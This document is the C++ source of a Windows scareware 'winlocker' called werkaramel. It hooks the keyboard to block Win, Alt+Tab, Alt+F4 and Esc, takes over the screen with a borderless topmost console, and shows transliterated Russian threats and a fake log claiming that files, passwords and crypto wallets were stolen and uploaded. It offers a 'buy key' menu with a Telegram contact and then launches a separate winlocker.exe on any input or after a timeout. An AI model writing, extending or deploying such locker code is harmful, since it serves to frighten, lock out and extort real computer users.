// language: C++, file: werkaramel.cpp, target: Windows 11 x64, MSVC
// werkaramel - red flash + cmd scene + timeout scare + winlocker
#include <windows.h>
#include <shellapi.h>
#include <string>
#include <thread>
#include <chrono>
#include <random>

const std::wstring PASS = L"123";
const std::wstring LOCKER_EXE = L"winlocker.exe";

int g_phase = 0;
int g_menu_choice = 0;
std::wstring g_typed;
size_t g_type_pos = 0;
std::wstring g_input;
bool g_wrong = false;
bool g_unlocked = false;
bool g_timeout_triggered = false;
HHOOK g_kbHook = nullptr;
HANDLE g_hOut = INVALID_HANDLE_VALUE;
HANDLE g_hIn = INVALID_HANDLE_VALUE;
HWND g_hCon = nullptr;
HWND g_hFlash = nullptr;
std::mt19937 g_rng(std::random_device{}());

int RandInt(int lo, int hi) {
    std::uniform_int_distribution<int> d(lo, hi);
    return d(g_rng);
}

// ── вступительный текст (транслит, без кракозябр) ───────────
const std::wstring SCENE_TEXT =
    L"ne pytaytes chto-to sdelat seychas. budet huzhe.\n"
    L"\n"
    L"vy skachali winlocker werkaramel. eto ne igrushka.\n"
    L"uzhe pozdno. vsyo chto nuzhno - sdelano.\n"
    L"\n"
    L"vse vashi dannye skopirovany. paroli, fayly, foto, perepiski.\n"
    L"vsyo eto uzhe na nashem servere.\n"
    L"\n"
    L"ne vyklyuchayte kompyuter. ne trogayte dispetcher zadach.\n"
    L"ne pytaytes snyat zadachu. sistema otslezhivaet lyubye deystviya.\n"
    L"\n"
    L"popytka zakryt eto okno = nemedlennaya blokirovka.\n"
    L"popytka perezagruzit = poterya dannyh navsegda.\n"
    L"\n"
    L"ostavaytes na meste. dalneyshie instrukcii poyavyatsya nizhe.";

// ── страшный текст при таймауте ─────────────────────────────
const std::wstring TIMEOUT_SCARE =
    L"> system detected suspicious inactivity\n"
    L"> bypass attempt registered\n"
    L"> escalating to phase 2\n"
    L"\n"
    L"> ransomware module loaded: werka_crypt_v3\n"
    L"> encryption key generated: 0x7F3A9C2E...\n"
    L"> scanning C:\\Users\\ for sensitive files\n"
    L"> indexing documents, photos, credentials\n"
    L"> indexed: 14,847 files / 6.2 GB\n"
    L"> uploading to remote server: 194.62.xx.xx\n"
    L"> upload complete. 100%\n"
    L"\n"
    L"> disabling task manager\n"
    L"> disabling system restore\n"
    L"> locking bootloader\n"
    L"> recording webcam\n"
    L"> logging keystrokes\n"
    L"> capturing clipboard\n"
    L"> dumping browser passwords\n"
    L"> stealing crypto wallets\n"
    L"> accessing telegram sessions\n"
    L"> exporting contacts\n"
    L"\n"
    L"> all security keys invalidated\n"
    L"> backup disabled\n"
    L"> recovery impossible\n"
    L"\n"
    L"> your device is now under our control\n"
    L"> do not attempt to shut down\n"
    L"> do not attempt to disconnect\n"
    L"> do not attempt to panic\n"
    L"\n"
    L"> proceeding to permanent lock...\n"
    L"> 3...\n"
    L"> 2...\n"
    L"> 1...\n"
    L"\n"
    L"> LOCKING NOW";

// ── запуск winlocker.exe ────────────────────────────────────
void LaunchLocker() {
    wchar_t self[MAX_PATH]{};
    GetModuleFileNameW(nullptr, self, MAX_PATH);
    std::wstring dir(self);
    size_t p = dir.find_last_of(L"\\/");
    if (p != std::wstring::npos) dir = dir.substr(0, p + 1);
    std::wstring full = dir + LOCKER_EXE;

    ShellExecuteW(nullptr, L"open", full.c_str(),
                  nullptr, dir.c_str(), SW_SHOW);
}

LRESULT CALLBACK KbHook(int code, WPARAM wp, LPARAM lp) {
    if (code == HC_ACTION && !g_unlocked) {
        auto* kb = (KBDLLHOOKSTRUCT*)lp;
        DWORD vk = kb->vkCode;
        if (vk == VK_LWIN || vk == VK_RWIN) return 1;
        if (vk == VK_TAB && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1;
        if (vk == VK_F4 && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1;
        if (vk == VK_ESCAPE) return 1;
        if (vk == VK_F11) return 1;
        if (g_phase == 0 || g_phase == 1 || g_phase == 2) return 1;
    }
    return CallNextHookEx(g_kbHook, code, wp, lp);
}

LRESULT CALLBACK FlashProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
    switch (msg) {
    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC dc = BeginPaint(hwnd, &ps);
        RECT rc; GetClientRect(hwnd, &rc);
        HBRUSH bg = CreateSolidBrush(RGB(140, 10, 10));
        FillRect(dc, &rc, bg);
        DeleteObject(bg);

        HFONT font = CreateFontW(120, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
                                 DEFAULT_CHARSET, OUT_DEFAULT_PRECIS,
                                 CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY,
                                 DEFAULT_PITCH, L"Arial");
        HFONT old = (HFONT)SelectObject(dc, font);
        SetTextColor(dc, RGB(255, 255, 255));
        SetBkMode(dc, TRANSPARENT);
        std::wstring s = L"VAS ZAMETILI";
        SIZE sz;
        GetTextExtentPoint32W(dc, s.c_str(), (int)s.size(), &sz);
        TextOutW(dc, (rc.right - sz.cx) / 2, (rc.bottom - sz.cy) / 2,
                 s.c_str(), (int)s.size());
        SelectObject(dc, old);
        DeleteObject(font);
        EndPaint(hwnd, &ps);
        return 0;
    }
    case WM_CLOSE: return 0;
    case WM_SYSCOMMAND:
        if ((wp & 0xFFF0) == SC_CLOSE) return 0;
        return 0;
    }
    return DefWindowProcW(hwnd, msg, wp, lp);
}

void WOut(const std::wstring& s) {
    DWORD w = 0;
    WriteConsoleW(g_hOut, s.c_str(), (DWORD)s.size(), &w, nullptr);
}
void SetColor(WORD attr) { SetConsoleTextAttribute(g_hOut, attr); }
void ClearScreen() {
    CONSOLE_SCREEN_BUFFER_INFO csbi;
    DWORD cells, w;
    COORD home = {0, 0};
    GetConsoleScreenBufferInfo(g_hOut, &csbi);
    cells = csbi.dwSize.X * csbi.dwSize.Y;
    FillConsoleOutputCharacterW(g_hOut, L' ', cells, home, &w);
    FillConsoleOutputAttribute(g_hOut, 0, cells, home, &w);
    SetConsoleCursorPosition(g_hOut, home);
}
void Gotoxy(int x, int y) {
    COORD c{ (SHORT)x, (SHORT)y };
    SetConsoleCursorPosition(g_hOut, c);
}

BOOL WINAPI CtrlHandler(DWORD type) {
    if (type == CTRL_C_EVENT) return TRUE;
    return FALSE;
}

void LockConsole() {
    LONG style = GetWindowLong(g_hCon, GWL_STYLE);
    style &= ~(WS_CAPTION | WS_THICKFRAME | WS_MINIMIZEBOX |
               WS_MAXIMIZEBOX | WS_SYSMENU);
    SetWindowLong(g_hCon, GWL_STYLE, style);

    HMENU menu = GetSystemMenu(g_hCon, FALSE);
    if (menu) {
        DeleteMenu(menu, SC_CLOSE, MF_BYCOMMAND);
        DeleteMenu(menu, SC_MINIMIZE, MF_BYCOMMAND);
        DeleteMenu(menu, SC_MAXIMIZE, MF_BYCOMMAND);
    }

    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    SetWindowPos(g_hCon, HWND_TOPMOST, 0, 0, sw, sh,
                 SWP_FRAMECHANGED | SWP_SHOWWINDOW);
    SetConsoleCtrlHandler(CtrlHandler, TRUE);
}

void PrintTyped() {
    SetColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
    Gotoxy(2, 2);
    int col = 2, row = 2;
    for (size_t i = 0; i < g_typed.size(); ++i) {
        wchar_t c = g_typed[i];
        if (c == L'\n') { col = 2; row++; Gotoxy(col, row); }
        else { WOut(std::wstring(1, c)); col++; }
    }
}

void PrintGlitch() {
    const wchar_t* noise = L"!@#$%^&*()_+-=[]{}|;:,.<>?/\\~`01";
    int nlen = (int)wcslen(noise);
    CONSOLE_SCREEN_BUFFER_INFO csbi;
    GetConsoleScreenBufferInfo(g_hOut, &csbi);
    int cols = csbi.dwSize.X, rows = csbi.dwSize.Y;
    ClearScreen();
    for (int i = 0; i < 120; ++i) {
        Gotoxy(RandInt(0, cols - 1), RandInt(0, rows - 1));
        SetColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
        WOut(std::wstring(1, noise[RandInt(0, nlen - 1)]));
    }
}

void PrintMenu() {
    ClearScreen();
    CONSOLE_SCREEN_BUFFER_INFO csbi;
    GetConsoleScreenBufferInfo(g_hOut, &csbi);
    int cols = csbi.dwSize.X;
    int rows = csbi.dwSize.Y;

    const wchar_t* banner[] = {
        L"██╗    ██╗███████╗██████╗ ██╗  ██╗ █████╗ ██████╗  █████╗ ███╗   ███╗███████╗██╗",
        L"██║    ██║██╔════╝██╔══██╗██║ ██╔╝██╔══██╗██╔══██╗██╔══██╗████╗ ████║██╔════╝██║",
        L"██║ █╗ ██║█████╗  ██████╔╝█████╔╝ ███████║██████╔╝███████║██╔████╔██║█████╗  ██║",
        L"██║███╗██║██╔══╝  ██╔══██╗██╔═██╗ ██╔══██║██╔══██╗██╔══██║██║╚██╔╝██║██╔══╝  ██║",
        L"╚███╔███╔╝███████╗██║  ██║██║  ██╗██║  ██║██║  ██║██║  ██║██║ ╚═╝ ██║███████╗███████╗",
        L" ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚══════╝",
    };

    SetColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
    int baseY = 1;
    for (int i = 0; i < 6; ++i) {
        Gotoxy(2, baseY + i);
        WOut(banner[i]);
    }
    Gotoxy(14, baseY + 7);
    WOut(L"W I N L O C K E R");

    std::wstring line(60, L'=');
    Gotoxy(2, baseY + 9);
    WOut(line);

    SetColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
    Gotoxy(2, baseY + 11);
    WOut(L"Vyberite deystvie:");

    SetColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
    Gotoxy(2, baseY + 13); WOut(L"[ 1 ]   Podderzhka  ->  tg @werkaramel");
    Gotoxy(2, baseY + 14); WOut(L"[ 2 ]   Kupit klyuch");
    Gotoxy(2, baseY + 15); WOut(L"[ 3 ]   Vyyti");

    SetColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
    std::wstring hint = L"vvedite chislo i nazhmite Enter";
    Gotoxy(2, rows - 4); WOut(hint);

    SetColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
    Gotoxy(2, rows - 2); WOut(L"> ");

    SetColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
    WOut(g_input + L"  ");
}

void PrintTimeoutScare() {
    ClearScreen();
    SetColor(FOREGROUND_RED | FOREGROUND_INTENSITY);

    CONSOLE_SCREEN_BUFFER_INFO csbi;
    GetConsoleScreenBufferInfo(g_hOut, &csbi);
    int cols = csbi.dwSize.X;

    std::wstring msg = L"vy dolgo dumayete...";
    Gotoxy((cols - (int)msg.size()) / 2, 5);
    WOut(msg);

    std::this_thread::sleep_for(std::chrono::seconds(1));

    ClearScreen();
    const wchar_t* banner[] = {
        L"██╗    ██╗███████╗██████╗ ██╗  ██╗ █████╗ ██████╗  █████╗ ███╗   ███╗███████╗██╗",
        L"██║    ██║██╔════╝██╔══██╗██║ ██╔╝██╔══██╗██╔══██╗██╔══██╗████╗ ████║██╔════╝██║",
        L"██║ █╗ ██║█████╗  ██████╔╝█████╔╝ ███████║██████╔╝███████║██╔████╔██║█████╗  ██║",
        L"██║███╗██║██╔══╝  ██╔══██╗██╔═██╗ ██╔══██║██╔══██╗██╔══██║██║╚██╔╝██║██╔══╝  ██║",
        L"╚███╔███╔╝███████╗██║  ██║██║  ██╗██║  ██║██║  ██║██║  ██║██║ ╚═╝ ██║███████╗███████╗",
        L" ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚══════╝",
    };

    SetColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
    int baseY = 1;
    for (int i = 0; i < 6; ++i) {
        Gotoxy(2, baseY + i);
        WOut(banner[i]);
    }
    Gotoxy(14, baseY + 7);
    WOut(L"W I N L O C K E R");

    int col = 2;
    int row = baseY + 9;
    Gotoxy(col, row);

    for (wchar_t c : TIMEOUT_SCARE) {
        if (c == L'\n') {
            col = 2; row++;
            Gotoxy(col, row);
        } else {
            WOut(std::wstring(1, c));
            col++;
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(5));
    }
}

DWORD WINAPI SceneThread(LPVOID) {
    SetConsoleOutputCP(CP_UTF8);
    SetConsoleCP(CP_UTF8);
    LockConsole();

    CONSOLE_FONT_INFOEX cfi{};
    cfi.cbSize = sizeof(cfi);
    cfi.dwFontSize.Y = 18;
    cfi.dwFontSize.X = 9;
    wcscpy_s(cfi.FaceName, L"Consolas");
    SetCurrentConsoleFontEx(g_hOut, FALSE, &cfi);

    std::this_thread::sleep_for(std::chrono::seconds(2));
    if (g_hFlash) {
        ShowWindow(g_hFlash, SW_HIDE);
        DestroyWindow(g_hFlash);
        g_hFlash = nullptr;
    }

    g_phase = 1;
    ClearScreen();
    auto start = std::chrono::steady_clock::now();
    while (g_type_pos < SCENE_TEXT.size()) {
        g_typed += SCENE_TEXT[g_type_pos++];
        PrintTyped();
        std::this_thread::sleep_for(std::chrono::milliseconds(40));
    }
    auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(
        std::chrono::steady_clock::now() - start).count();
    if (elapsed < 2000)
        std::this_thread::sleep_for(std::chrono::milliseconds(2000 - elapsed));

    g_phase = 2;
    for (int i = 0; i < 15; ++i) {
        PrintGlitch();
        std::this_thread::sleep_for(std::chrono::milliseconds(80));
    }

    g_phase = 3;
    PrintMenu();
    return 0;
}

DWORD WINAPI InputThread(LPVOID) {
    INPUT_RECORD rec;
    DWORD read = 0;
    auto menu_start = std::chrono::steady_clock::now();
    bool menu_started = false;

    while (!g_unlocked) {
        if (g_phase == 3 && !g_timeout_triggered) {
            if (!menu_started) {
                menu_start = std::chrono::steady_clock::now();
                menu_started = true;
            }
            auto el = std::chrono::duration_cast<std::chrono::seconds>(
                std::chrono::steady_clock::now() - menu_start).count();
            if (el >= 30) {
                g_timeout_triggered = true;
                g_phase = 6;
                PrintTimeoutScare();
                LaunchLocker();
                std::this_thread::sleep_for(std::chrono::seconds(2));
                ExitProcess(0);
            }
        }

        if (!ReadConsoleInputW(g_hIn, &rec, 1, &read)) {
            std::this_thread::sleep_for(std::chrono::milliseconds(10));
            continue;
        }
        if (rec.EventType != KEY_EVENT) continue;
        if (!rec.Event.KeyEvent.bKeyDown) continue;

        wchar_t c = rec.Event.KeyEvent.uChar.UnicodeChar;
        if (c == 0) continue;

        if (g_phase == 3) {
            menu_start = std::chrono::steady_clock::now();
            if (c >= L'0' && c <= L'9') {
                g_input += c;
                PrintMenu();
            } else if (c == L'\b') {
                if (!g_input.empty()) g_input.pop_back();
                PrintMenu();
            } else if (c == L'\r') {
                if (g_input == L"1" || g_input == L"2" || g_input == L"3") {
                    g_input.clear();
                    g_unlocked = true;
                    UnhookWindowsHookEx(g_kbHook);
                    LaunchLocker();
                    std::this_thread::sleep_for(std::chrono::seconds(2));
                    ExitProcess(0);
                } else {
                    g_input.clear();
                    PrintMenu();
                }
            }
        }
    }
    return 0;
}

int wmain() {
    g_hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    g_hIn = GetStdHandle(STD_INPUT_HANDLE);
    g_hCon = GetConsoleWindow();
    ShowWindow(g_hCon, SW_SHOW);
    SetForegroundWindow(g_hCon);

    WNDCLASSW fw{};
    fw.lpfnWndProc = FlashProc;
    fw.hInstance = GetModuleHandleW(nullptr);
    fw.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
    fw.lpszClassName = L"werka_flash";
    RegisterClassW(&fw);

    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);

    g_hFlash = CreateWindowExW(
        WS_EX_TOPMOST, L"werka_flash", L"",
        WS_POPUP, 0, 0, sw, sh,
        nullptr, nullptr, GetModuleHandleW(nullptr), nullptr);

    ShowWindow(g_hFlash, SW_SHOWMAXIMIZED);
    SetForegroundWindow(g_hFlash);
    UpdateWindow(g_hFlash);

    g_kbHook = SetWindowsHookExW(WH_KEYBOARD_LL, KbHook,
                                  GetModuleHandleW(nullptr), 0);

    CreateThread(nullptr, 0, SceneThread, nullptr, 0, nullptr);
    CreateThread(nullptr, 0, InputThread, nullptr, 0, nullptr);

    MSG m;
    while (GetMessageW(&m, nullptr, 0, 0)) {
        TranslateMessage(&m);
        DispatchMessageW(&m);
    }
    return 0;
}
